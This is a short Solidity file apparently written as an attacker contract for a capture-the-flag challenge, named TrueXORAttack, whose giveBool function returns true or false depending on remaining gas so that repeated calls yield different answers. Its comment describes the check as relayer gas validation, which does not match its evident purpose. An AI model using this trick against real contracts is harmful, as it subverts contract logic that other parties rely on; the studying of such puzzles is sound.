// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract TrueXORAttack {
    // Validate that the relayer has sent enough gas for the call.
    // See https://ronan.eth.limo/blog/ethereum-gas-dangers/
    function giveBool() external view returns (bool) {
        if(gasleft() < 1400) return true;
        else return false;
    }
}